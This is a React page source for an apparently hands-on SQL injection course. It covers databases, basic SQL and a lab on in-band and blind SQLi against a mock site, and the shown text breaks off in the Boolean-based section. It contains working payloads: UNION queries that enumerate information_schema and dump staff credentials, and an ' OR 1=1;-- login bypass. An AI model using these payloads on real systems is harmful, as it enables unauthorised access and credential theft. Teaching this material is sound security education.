import React from "react";
import Header from "../../Header/Header";
import Footer from "../../Footer/Footer";
import "../../Components/Topics CSS/topics.css";
import background from "../../assets/img/SQL_Injection/New/background.png";
import courseImage from "../../assets/img/SQL_Injection/New/courseImage.png";
import UseFaqSection from "../../Components/UseFaqSection/UseFaqSection.jsx";
import CourseLanding from "../../Components/CourseLanding/CourseLanding.jsx";
import Banner from "../../Components/Banner/Banner.jsx";
import "../Page_Styles/Content_sec.css";
import Go2TopBtn from "../../Components/Go2Top_Btn/Go2Top_Btn.jsx";
import DBServer from "../../assets/img/SQL_Injection/DBServer.png";
import OutOfBand from "../../assets/img/SQL_Injection/Out-of-Band SQLi.png";
import table from "../../assets/img/SQL_Injection/table.png";
import ThemeSwitcher from "../../Components/ThemeSwitcher/ThemeSwitcher.jsx";
export default function Sql_Injection() {
  const { faqSectionRef, handleGoToLab } = UseFaqSection();

  return (
    <>
      <Banner />
      <Header />
      <ThemeSwitcher />
      {/* Start Landing */}
      <CourseLanding
        background={background}
        backgroundStyle={{ objectFit: "cover", height: "100%", width: "100%" }}
        courseImage={courseImage}
        courseTitle="SQL Injection"
        courseDescription="Learn how attackers exploit vulnerabilities in web applications
                using SQL injection and understand the techniques to detect and
                prevent them."
        difficulty="Intermediate"
        duration="30 min"
        onSaveRoom={() => console.log("Room Saved!")}
        onLike={() => console.log("Liked!")}
        onDislike={() => console.log("Disliked!")}
      />
      {/* End Landing */}

      {/* Start Course */}
      <div className="Content ">
        <div className="secure-container" ref={faqSectionRef}>
          <div className="content-row">
            <div className="content-section">
              <dl className="topics-text ">
                {/* Intro */}
                <dt className="fadeInUp faq-header">
                  <span>Intro </span> Brief
                </dt>
                <dd className="fadeInUp faq-body open-sans" id="border-left">
                  <p>
                    <b className="content__subtitle">
                      SQL (Structured Query Language) Injection
                    </b>
                    : mostly referred to as SQLi, is an attack on a web
                    application database server that causes malicious queries to
                    be executed. When a web application communicates with a
                    database using input from a user that hasn't been properly
                    validated, there runs the potential of an attacker being
                    able to steal, delete or alter private and customer data and
                    also attack the web application authentication methods to
                    private or customer areas. This is why SQLi is one of the
                    oldest web application vulnerabilities, and it can also be
                    the most damaging.
                  </p>
                  <p className="note">
                    In this room, you'll learn what databases are, what SQL is
                    with some basic SQL commands, how to detect SQL
                    vulnerabilities, how to exploit SQLi vulnerabilities and, as
                    a developer, how you can protect yourself against SQL
                    Injection.
                  </p>
                </dd>
                {/* Topic 1 */}
                <dt className="fadeInUp faq-header">
                  <span>Topic 1</span> What is a Database?
                </dt>
                <dd className="fadeInUp faq-body open-sans" id="border-left">
                  <p>
                    If you're not used to working with databases or exploiting
                    them, there's probably some new terminology to get used to,
                    so let's start with some basics on how databases are
                    structured and how they work.
                  </p>
                  <p>
                    <h3 className="content__title">What is a database?</h3> A
                    database is a way of electronically storing collections of
                    data in an organised manner. A database is controlled by a
                    DBMS, which is an acronym for Database Management System.
                    DBMSs fall into two camps: Relational and Non-Relational;
                    the focus of this room will be on Relational databases; some
                    common ones you'll come across are MySQL, Microsoft SQL
                    Server, Access, PostgreSQL and SQLite. We'll explain the
                    difference between Relational and Non-Relational databases
                    at the end of this Topic, but first, it's important to learn
                    a few terms.
                  </p>
                  <p>
                    Within a DBMS, you can have multiple databases, each
                    containing its own set of related data. For example, you may
                    have a database called <strong>"shop"</strong>. Within this
                    database, you want to store information about products
                    available to <strong>purchase</strong>,{" "}
                    <strong>users</strong> who have signed up to your online
                    shop, and information about the <strong>orders</strong>{" "}
                    you've received. You'd store this information separately in
                    the database using something called tables. The tables are
                    identified with a unique name for each one. You can see this
                    structure in the diagram below, but you can also see how a
                    business might have other separate databases to store staff
                    information or the accounts team.
                  </p>
                  <div className="bg-light p-3 w-75  mx-auto">
                    <img
                      src={DBServer}
                      alt=""
                      className="img-fluid  d-block "
                    />
                  </div>
                  <hr />
                  <p className="mt-3">
                    <h3 className="content__title">What are tables?</h3> A table
                    is made up of columns and rows; a useful way to imagine a
                    table is like a grid with the columns going across the top
                    from left to right containing the name of the cell and the
                    rows going from top to bottom, with each one having the
                    actual data.
                  </p>
                  <img
                    src={table}
                    alt=""
                    className="img-fluid w-50 mx-auto d-block "
                  />
                  <hr />
                  <p>
                    <h3 className="content__title">Columns:</h3> Each column,
                    better referred to as a field, has a unique name per table.
                    When creating a column, you also set the type of data it
                    will contain, common ones being integers (numbers), strings
                    (standard text) or dates. Some databases can contain much
                    more complex data, such as geospatial, which contains
                    location information. Setting the data type also ensures
                    that incorrect information isn't stored, such as the string
                    "hello world" being stored in a column meant for dates. If
                    this happens, the database server will usually produce an
                    error message. A column containing an integer can also have
                    an auto-increment feature enabled; this gives each row of
                    data a unique number that grows (increments) with each
                    subsequent row. Doing so creates what is called a key field;
                    a key field has to be unique for every row of data, which
                    can be used to find that exact row in SQL queries.
                  </p>
                  <p>
                    <h3 className="content__title">Rows:</h3> Rows or records
                    contain individual lines of data. When you add data to the
                    table, a new row/record is created; when you delete data, a
                    row/record is removed.
                  </p>
                  <p>
                    <h3 className="content__title">
                      Relational Vs Non-Relational Databases:
                    </h3>{" "}
                    A relational database stores information in tables, and
                    often, the tables share information between them; they use
                    columns to specify and define the data being stored and rows
                    actually to store the data. The tables will often contain a
                    column that has a unique ID (primary key), which will then
                    be used in other tables to reference it and cause a
                    relationship between the tables, hence the name{" "}
                    <strong>relational</strong> database.
                  </p>
                  <p>
                    Non-relational databases, sometimes called NoSQL, on the
                    other hand, are any sort of database that doesn't use
                    tables, columns and rows to store the data. A specific
                    database layout doesn't need to be constructed so each row
                    of data can contain different information, giving more
                    flexibility over a relational database. Some popular
                    databases of this type are MongoDB, Cassandra and
                    ElasticSearch.
                  </p>
                </dd>
                {/* Topic 2 */}
                <dt className="fadeInUp faq-header">
                  <span>Topic 2</span> What is SQL?
                </dt>
                <dd className="fadeInUp faq-body open-sans" id="border-left">
                  <p>
                    SQL (Structured Query Language) is a feature-rich language
                    used for querying databases. These SQL queries are better
                    referred to as statements.
                  </p>
                  <p>
                    The simplest of the commands which we'll cover in this Topic
                    is used to retrieve (select), update, insert and delete
                    data. Although somewhat similar, some database servers have
                    their own syntax and slight changes to how things work. All
                    of these examples are based on a MySQL database. After
                    learning the lessons, you'll easily be able to search for
                    alternative syntax online for the different servers. It's
                    worth noting that SQL syntax is not case-sensitive.
                  </p>
                  <p>
                    <h3 className="content__title">SELECT</h3>
                    The first query type we'll learn is the SELECT query used to
                    retrieve data from the database.{" "}
                  </p>
                  <p>
                    <code className="content__code">select * from users;</code>
                  </p>
                  <hr />
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>1</td>
                        <td>jon</td>
                        <td>pass123</td>
                      </tr>
                      <tr>
                        <td>2</td>
                        <td>admin</td>
                        <td>p4ssword</td>
                      </tr>
                      <tr>
                        <td>3</td>
                        <td>martin</td>
                        <td>secret123</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    The first word SELECT, tells the database we want to
                    retrieve some data; the * tells the database we want to
                    receive back all columns from the table. For example, the
                    table may contain three columns (id, username and password).
                    "from users" tells the database we want to retrieve the data
                    from the table named users. Finally, the semicolon at the
                    end tells the database that this is the end of the query.{" "}
                  </p>
                  <p>
                    The next query is similar to the above, but this time,
                    instead of using the * to return all columns in the database
                    table, we are just requesting the username and password
                    field.
                  </p>
                  <p>
                    <code className="content__code">
                      select username,password from users;
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>jon</td>
                        <td>pass123</td>
                      </tr>
                      <tr>
                        <td>admin</td>
                        <td>p4ssword</td>
                      </tr>
                      <tr>
                        <td>martin</td>
                        <td>secret123</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    The following query, like the first, returns all the columns
                    by using the * selector, and then the "LIMIT 1" clause
                    forces the database to return only one row of data. Changing
                    the query to "LIMIT 1,1" forces the query to skip the first
                    result, and then "LIMIT 2,1" skips the first two results,
                    and so on. You need to remember the first number tells the
                    database how many results you wish to skip, and the second
                    number tells the database how many rows to return.
                  </p>
                  <p>
                    <code className="content__code">
                      select * from users LIMIT 1;
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>1</td>
                        <td>jon</td>
                        <td>pass123</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    Lastly, we're going to utilise the where clause; this is how
                    we can finely pick out the exact data we require by
                    returning data that matches our specific clauses:
                  </p>
                  <p>
                    <code className="content__code">
                      select * from users where username='admin';
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>2</td>
                        <td>admin</td>
                        <td>p4ssword</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    This will only return the rows where the username is equal
                    to admin.
                  </p>
                  <p>
                    <code className="content__code">
                      select * from users where username != 'admin';
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>1</td>
                        <td>jon</td>
                        <td>pass123</td>
                      </tr>
                      <tr>
                        <td>3</td>
                        <td>martin</td>
                        <td>secret123</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    This will only return the rows where the username is NOT
                    equal to admin.
                  </p>
                  <p>
                    <code className="content__code">
                      select * from users where username='admin' or
                      username='jon';
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>1</td>
                        <td>jon</td>
                        <td>pass123</td>
                      </tr>
                      <tr>
                        <td>2</td>
                        <td>admin</td>
                        <td>p4ssword</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    This will only return the rows where the username is either
                    equal to admin or jon.{" "}
                  </p>
                  <p>
                    <code className="content__code">
                      select * from users where username='admin' and
                      password='p4ssword';
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>2</td>
                        <td>admin</td>
                        <td>p4ssword</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    This will only return the rows where the username is equal
                    to admin and the password is equal to p4ssword.
                  </p>
                  <p>
                    Using the like clause allows you to specify data that isn't
                    an exact match but instead either starts, contains or ends
                    with certain characters by choosing where to place the
                    wildcard character represented by a percentage sign %.
                  </p>
                  <p>
                    <code className="content__code">
                      select * from users where username like 'a%';
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>2</td>
                        <td>admin</td>
                        <td>p4ssword</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    This returns any rows with a username beginning with the
                    letter a.
                  </p>
                  <p>
                    <code className="content__code">
                      select * from users where username like '%n';
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>1</td>
                        <td>jon</td>
                        <td>pass123</td>
                      </tr>
                      <tr>
                        <td>2</td>
                        <td>admin</td>
                        <td>p4ssword</td>
                      </tr>
                      <tr>
                        <td>3</td>
                        <td>martin</td>
                        <td>secret123</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    This returns any rows with a username ending with the letter
                    n.
                  </p>
                  <p>
                    <code className="content__code">
                      select * from users where username like '%mi%';
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>2</td>
                        <td>admin</td>
                        <td>p4ssword</td>
                      </tr>
                    </tbody>
                  </table>

                  <p>
                    This returns any rows with a username containing the
                    characters mi within them.
                  </p>
                  <p>
                    <h3 className="content__title">UNION</h3>The UNION statement
                    combines the results of two or more SELECT statements to
                    retrieve data from either single or multiple tables; the
                    rules to this query are that the UNION statement must
                    retrieve the same number of columns in each SELECT
                    statement, the columns have to be of a similar data type,
                    and the column order has to be the same. This might sound
                    not very clear, so let's use the following analogy. Say a
                    company wants to create a list of addresses for all
                    customers and suppliers to post a new catalogue. We have one
                    table called customers with the following contents:
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Name</th>
                        <th>Address</th>
                        <th>City</th>
                        <th>Postcode</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>1</td>
                        <td>Mr John Smith</td>
                        <td>123 Fake Street</td>
                        <td>Manchester</td>
                        <td>M2 3FJ</td>
                      </tr>
                      <tr>
                        <td>2</td>
                        <td>Mrs Jenny Palmer</td>
                        <td>99 Green Road</td>
                        <td>Birmingham</td>
                        <td>B2 4KL</td>
                      </tr>
                      <tr>
                        <td>3</td>
                        <td>Miss Sarah Lewis</td>
                        <td>15 Fore Street</td>
                        <td>London</td>
                        <td>NW12 3GH</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    And another called suppliers with the following contents:
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Company</th>
                        <th>Address</th>
                        <th>City</th>
                        <th>Postcode</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>1</td>
                        <td>Widgets Ltd</td>
                        <td>Unit 1a, Newby Estate</td>
                        <td>Bristol</td>
                        <td>BS19 4RT</td>
                      </tr>
                      <tr>
                        <td>2</td>
                        <td>The Tool Company</td>
                        <td>75 Industrial Road</td>
                        <td>Norwich</td>
                        <td>N22 3DR</td>
                      </tr>
                      <tr>
                        <td>3</td>
                        <td>Axe Makers Ltd</td>
                        <td>2b Makers Unit, Market Road</td>
                        <td>London</td>
                        <td>SE9 1KK</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    Using the following SQL Statement, we can gather the results
                    from the two tables and put them into one result set:
                  </p>
                  <p>
                    <code className="content__code">
                      SELECT name,address,city,postcode from customers UNION
                      SELECT company,address,city,postcode from suppliers;
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>Name</th>
                        <th>Address</th>
                        <th>City</th>
                        <th>Postcode</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>Mr John Smith</td>
                        <td>123 Fake Street</td>
                        <td>Manchester</td>
                        <td>M2 3FJ</td>
                      </tr>
                      <tr>
                        <td>Mrs Jenny Palmer</td>
                        <td>99 Green Road</td>
                        <td>Birmingham</td>
                        <td>B2 4KL</td>
                      </tr>
                      <tr>
                        <td>Miss Sarah Lewis</td>
                        <td>15 Fore Street</td>
                        <td>London</td>
                        <td>NW12 3GH</td>
                      </tr>
                      <tr>
                        <td>Widgets Ltd</td>
                        <td>Unit 1a, Newby Estate</td>
                        <td>Bristol</td>
                        <td>BS19 4RT</td>
                      </tr>
                      <tr>
                        <td>The Tool Company</td>
                        <td>75 Industrial Road</td>
                        <td>Norwich</td>
                        <td>N22 3DR</td>
                      </tr>
                      <tr>
                        <td>Axe Makers Ltd</td>
                        <td>2b Makers Unit, Market Road</td>
                        <td>London</td>
                        <td>SE9 1KK</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    <h3 className="content__title">insert</h3>The INSERT
                    statement tells the database we wish to insert a new row of
                    data into the table. "into users" tells the database which
                    table we wish to insert the data into, "
                  </p>
                  <p>
                    (username,password)" provides the columns we are providing
                    data for and then "values ('bob','password');" provides the
                    data for the previously specified columns.
                  </p>
                  <p>
                    <code className="content__code">
                      insert into users (username,password) values
                      ('bob','password123');
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>1</td>
                        <td>jon</td>
                        <td>pass123</td>
                      </tr>
                      <tr>
                        <td>2</td>
                        <td>admin</td>
                        <td>p4ssword</td>
                      </tr>
                      <tr>
                        <td>3</td>
                        <td>martin</td>
                        <td>secret123</td>
                      </tr>
                      <tr>
                        <td>4</td>
                        <td>bob</td>
                        <td>password123</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    <h3 className="content__title">UPDATE</h3>The UPDATE
                    statement tells the database we wish to update one or more
                    rows of data within a table. You specify the table you wish
                    to update using "update %tablename% SET" and then select the
                    field or fields you wish to update as a comma-separated list
                    such as "username='root',password='pass123'" then finally,
                    similar to the SELECT statement, you can specify exactly
                    which rows to update using the where clause such as "where
                    username='admin;".
                  </p>
                  <p>
                    <code className="content__code">
                      update users SET username='root',password='pass123' where
                      username='admin';
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>1</td>
                        <td>jon</td>
                        <td>pass123</td>
                      </tr>
                      <tr>
                        <td>2</td>
                        <td>root</td>
                        <td>pass123</td>
                      </tr>
                      <tr>
                        <td>3</td>
                        <td>martin</td>
                        <td>secret123</td>
                      </tr>
                      <tr>
                        <td>4</td>
                        <td>bob</td>
                        <td>password123</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    <h3 className="content__title">DELETE</h3>The DELETE
                    statement tells the database we wish to delete one or more
                    rows of data. Apart from missing the columns you wish to
                    return, the format of this query is very similar to the
                    SELECT. You can specify precisely which data to delete using
                    the where clause and the number of rows to be deleted using
                    the LIMIT clause.
                  </p>
                  <p>
                    <code className="content__code">
                      delete from users where username='martin';
                    </code>
                  </p>
                  <table class="table table-bordered table-striped text-center mx-auto">
                    <thead class="table-dark">
                      <tr>
                        <th>ID</th>
                        <th>Username</th>
                        <th>Password</th>
                      </tr>
                    </thead>
                    <tbody>
                      <tr>
                        <td>1</td>
                        <td>jon</td>
                        <td>pass123</td>
                      </tr>
                      <tr>
                        <td>2</td>
                        <td>root</td>
                        <td>pass123</td>
                      </tr>
                      <tr>
                        <td>4</td>
                        <td>bob</td>
                        <td>password123</td>
                      </tr>
                    </tbody>
                  </table>
                  <p>
                    <code className="content__code">delete from users;</code>
                  </p>
                </dd>
                {/* Topic 3 */}
                <dt className="fadeInUp faq-header">
                  <span>Topic 3</span> What is SQL Injection?
                </dt>
                <dd className="fadeInUp faq-body open-sans" id="border-left">
                  <p>
                    <h3 className="content__title">What is SQL Injection?</h3>
                    The point wherein a web application using SQL can turn into
                    SQL Injection is when user-provided data gets included in
                    the SQL query.
                  </p>
                  <p>
                    <h3 className="content__title">What does it look like?</h3>
                    Take the following scenario where you've come across an
                    online blog, and each blog entry has a unique ID number. The
                    blog entries may be either set to public or private,
                    depending on whether they're ready for public release. The
                    URL for each blog entry may look something like this:
                  </p>
                  <code className="content__code">
                    https://website.thm/blog?id=1
                  </code>
                  <p>
                    From the URL above, you can see that the blog entry selected
                    comes from the id parameter in the query string. The web
                    application needs to retrieve the article from the database
                    and may use an SQL statement that looks something like the
                    following:
                  </p>
                  <code className="content__code">
                    SELECT * from blog where id=1 and private=0 LIMIT 1;
                  </code>
                  <p>
                    From what you've learned in the previous Topic, you should be
                    able to work out that the SQL statement above is looking in
                    the blog table for an article with the id number of 1 and
                    the private column set to 0, which means it's able to be
                    viewed by the public and limits the results to only one
                    match.
                  </p>
                  <p>
                    As was mentioned at the start of this Topic, SQL Injection is
                    introduced when user input is introduced into the database
                    query. In this instance, the id parameter from the query
                    string is used directly in the SQL query.
                  </p>
                  <p>
                    Let's pretend article ID 2 is still locked as private, so it
                    cannot be viewed on the website. We could now instead call
                    the URL:
                  </p>
                  <code className="content__code">
                    https://website.thm/blog?id=2;--
                  </code>
                  <p>Which would then, in turn, produce the SQL statement:</p>
                  <code className="content__code">
                    {" "}
                    SELECT * from blog where id=2;-- and private=0 LIMIT 1
                  </code>
                  <p>
                    The semicolon in the URL signifies the end of the SQL
                    statement, and the two dashes cause everything afterwards to
                    be treated as a comment. By doing this, you're just, in
                    fact, running the query:
                  </p>
                  <code className="content__code">
                    SELECT * from blog where id=2;--
                  </code>
                  <p>
                    Which will return the article with an ID of 2 whether it is
                    set to public or not.
                  </p>
                </dd>
                {/* Topic 4 */}
                <dt className="fadeInUp faq-header">
                  <span>Topic 4</span> In-Band SQLi
                </dt>
                <dd className="fadeInUp faq-body open-sans" id="border-left">
                  <p>
                    <h3 className="content__title">In-Band SQL Injection</h3>
                    In-Band SQL Injection is the easiest type to detect and
                    exploit; In-Band just refers to the same method of
                    communication being used to exploit the vulnerability and
                    also receive the results, for example, discovering an SQL
                    Injection vulnerability on a website page and then being
                    able to extract data from the database to the same page.
                  </p>
                  <p>
                    <h3 className="content__title">
                      Error-Based SQL Injection
                    </h3>
                    This type of SQL Injection is the most useful for easily
                    obtaining information about the database structure, as error
                    messages from the database are printed directly to the
                    browser screen. This can often be used to enumerate a whole
                    database.
                  </p>
                  <p>
                    <h3 className="content__title">
                      Union-Based SQL Injection
                    </h3>
                    This type of Injection utilises the SQL UNION operator
                    alongside a SELECT statement to return additional results to
                    the page. This method is the most common way of extracting
                    large amounts of data via an SQL Injection vulnerability.
                  </p>
                  <p>
                    <h3 className="content__title">Practical:</h3>
                    Click the green "Start Machine" button to use the SQL
                    Injection Example practice lab. Each level contains a mock
                    browser and also SQL Query and Error boxes to assist in
                    getting your queries/payload correct.
                  </p>
                  <p>
                    Level one of the practice lab contains a mock browser and
                    website featuring a blog with different articles, which can
                    be accessed by changing the id number in the query string.
                  </p>
                  <p>
                    The key to discovering error-based SQL Injection is to break
                    the code's SQL query by trying certain characters until an
                    error message is produced; these are most commonly single
                    apostrophes ( ' ) or a quotation mark ( " ).
                  </p>
                  <p>
                    Try typing an apostrophe ( ' ) after the id=1 and press
                    enter. And you'll see this returns an SQL error informing
                    you of an error in your syntax. The fact that you've
                    received this error message confirms the existence of an SQL
                    Injection vulnerability. We can now exploit this
                    vulnerability and use the error messages to learn more about
                    the database structure.{" "}
                  </p>
                  <p>
                    The first thing we need to do is return data to the browser
                    without displaying an error message. Firstly, we'll try the
                    UNION operator so we can receive an extra result if we
                    choose it. Try setting the mock browsers id parameter to:
                  </p>
                  <code className="content__code">1 UNION SELECT 1</code>{" "}
                  <p>
                    This statement should produce an error message informing you
                    that the UNION SELECT statement has a different number of
                    columns than the original SELECT query. So let's try again
                    but add another column:
                  </p>
                  <code className="content__code">1 UNION SELECT 1,2</code>{" "}
                  <p>
                    Same error again, so let's repeat by adding another column:
                  </p>
                  <code className="content__code">1 UNION SELECT 1,2,3</code>{" "}
                  <p>
                    Success, the error message has gone, and the article is
                    being displayed, but now we want to display our data instead
                    of the article. The article is displayed because it takes
                    the first returned result somewhere in the website's code
                    and shows that. To get around that, we need the first query
                    to produce no results. This can simply be done by changing
                    the article ID from 1 to 0.
                  </p>
                  <code className="content__code">0 UNION SELECT 1,2,3</code>
                  <p>
                    You'll now see the article is just made up of the result
                    from the UNION select, returning the column values 1, 2, and
                    3. We can start using these returned values to retrieve more
                    useful information. First, we'll get the database name that
                    we have access to:
                  </p>
                  <code className="content__code">
                    0 UNION SELECT 1,2,database()
                  </code>
                  <p>
                    You'll now see where the number 3 was previously displayed;
                    it now shows the name of the database, which is sqli_one.
                  </p>
                  <p>
                    Our next query will gather a list of tables that are in this
                    database.
                  </p>
                  <code className="content__code">
                    0 UNION SELECT 1,2,group_concat(table_name) FROM
                    information_schema.tables WHERE table_schema = 'sqli_one'
                  </code>
                  <p>
                    There are a couple of new things to learn in this query.
                    Firstly, the method group_concat() gets the specified column
                    (in our case, table_name) from multiple returned rows and
                    puts it into one string separated by commas. The next thing
                    is the information_schema database; every user of the
                    database has access to this, and it contains information
                    about all the databases and tables the user has access to.
                    In this particular query, we're interested in listing all
                    the tables in the sqli_one database, which is article and
                    staff_users.
                  </p>
                  <p>
                    As the first level aims to discover Martin's password, the
                    staff_users table is what interests us. We can utilise the
                    information_schema database again to find the structure of
                    this table using the below query.
                  </p>
                  <code className="content__code">
                    0 UNION SELECT 1,2,group_concat(column_name) FROM
                    information_schema.columns WHERE table_name = 'staff_users'
                  </code>{" "}
                  <p>
                    This is similar to the previous SQL query. However, the
                    information we want to retrieve has changed from table_name
                    to column_name, the table we are querying in the
                    information_schema database has changed from tables to
                    columns, and we're searching for any rows where the
                    table_name column has a value of staff_users.
                  </p>
                  <p>
                    The query results provide three columns for the staff_users
                    table: id, password, and username. We can use the username
                    and password columns for our following query to retrieve the
                    user's information.
                  </p>
                  <code className="content__subtitle">
                    0 UNION SELECT 1,2,group_concat(username,':',password
                    SEPARATOR ) FROM staff_users
                  </code>
                  <p>
                    Again, we use the group_concat method to return all of the
                    rows into one string and make it easier to read. We've also
                    added ,':', to split the username and password from each
                    other. Instead of being separated by a comma, we've chosen
                    the HTML tag that forces each result to be on a separate
                    line to make for easier reading.
                  </p>
                </dd>
                {/* Topic 5 */}
                <dt className="fadeInUp faq-header">
                  <span>Topic 5</span> Blind SQLi - Authentication Bypass
                </dt>
                <dd className="fadeInUp faq-body open-sans" id="border-left">
                  <p>
                    <h3 className="content__title">Blind SQLi</h3>Unlike In-Band
                    SQL injection, where we can see the results of our attack
                    directly on the screen, blind SQLi is when we get little to
                    no feedback to confirm whether our injected queries were, in
                    fact, successful or not, this is because the error messages
                    have been disabled, but the injection still works
                    regardless. It might surprise you that all we need is that
                    little bit of feedback to successfully enumerate a whole
                    database.
                  </p>
                  <p>
                    <h3 className="content__title">Authentication Bypass</h3>One
                    of the most straightforward Blind SQL Injection techniques
                    is when bypassing authentication methods such as login
                    forms. In this instance, we aren't that interested in
                    retrieving data from the database; We just want to get past
                    the login.{" "}
                  </p>
                  <p>
                    Login forms that are connected to a database of users are
                    often developed in such a way that the web application isn't
                    interested in the content of the username and password but
                    more in whether the two make a matching pair in the users
                    table. In basic terms, the web application is asking the
                    database, "Do you have a user with the username bob and the
                    password bob123?" the database replies with either yes or no
                    (true/false) and, depending on that answer, dictates whether
                    the web application lets you proceed or not.{" "}
                  </p>
                  <p>
                    Taking the above information into account, it's unnecessary
                    to enumerate a valid username/password pair. We just need to
                    create a database query that replies with a yes/true.
                  </p>
                  <p>
                    <h3 className="content__title">Practical:</h3>Level Two of
                    the SQL Injection examples shows this exact example. We can
                    see in the box labelled "SQL Query" that the query to the
                    database is the following:
                  </p>
                  <code className="content__code">
                    select * from users where username='%username%' and
                    password='%password%' LIMIT 1;
                  </code>{" "}
                  <p>
                    N.B The %username% and %password% values are taken from the
                    login form fields. The initial values in the SQL Query box
                    will be blank as these fields are currently empty.
                  </p>
                  <p>
                    To make this into a query that always returns as true, we
                    can enter the following into the password field:
                  </p>
                  <code className="content__code">' OR 1=1;--</code>{" "}
                  <p>Which turns the SQL query into the following:</p>
                  <code className="content__code">
                    select * from users where username='' and password='' OR
                    1=1;
                  </code>{" "}
                  <p>
                    Because 1=1 is a true statement and we've used an OR
                    operator, this will always cause the query to return as
                    true, which satisfies the web applications logic that the
                    database found a valid username/password combination and
                    that access should be allowed.
                  </p>
                </dd>
                {/* Topic 6 */}
                <dt className="fadeInUp faq-header">
                  <span>Topic 6</span> Blind SQLi - Boolean Based
                </dt>
                <dd className="fadeInUp faq-body open-sans" id="border-left">
                  <h3 className="content__title">Boolean Based</h3>
                  <p>
                    Boolean-based SQL Injection refers to the response we
                    receive from our injection attempts, which could be a
                    true/false, yes/no, on/off, 1/0 or any response that can
                    only have two outcomes. That outcome confirms that our SQL
                    Injection payload was either successful or not. On the first
                    inspection, you may feel like this limited response can't
                    provide much information. Still, with just these two
                    responses, it's possible to enumerate a whole database
                    structure and contents.
                  </p>
                  <h3 className="content__title">Practical:</h3>
                  <p>
                    On level three of the SQL Injection Examples Machine, you're
                    presented with a mock browser with the following URL:
                  </p>
                  <b className="content__subtitle">
                    https://website.thm/checkuser?username=admin
                  </b>
                  <p>
                    The browser body contains <strong>"taken":true.</strong>{" "}
                    This API endpoint replicates a common feature found on many
                    signup forms, which checks whether a username has already
                    been registered to prompt the user to choose a different
                    username. Because the <strong>taken</strong> value is set to{" "}
                    <strong>true</strong>, we can assume the username admin is
                    already registered. We can confirm this by changing the
                    username in the mock browser's address bar from{" "}
                    <strong>admin</strong> to <strong>admin123</strong>, and
                    upon pressing enter, you'll see the value taken has now
                    changed to false.
                  </p>
                  <p>
                    The SQL query that is processed looks like the following:
                  </p>
                  <code className="content__code">
                    select * from users where username = '%username%' LIMIT 1;
                  </code>
                  <p>
                    The only input we have control over is the username in the
                    query string, and we'll have to use this to perform our SQL
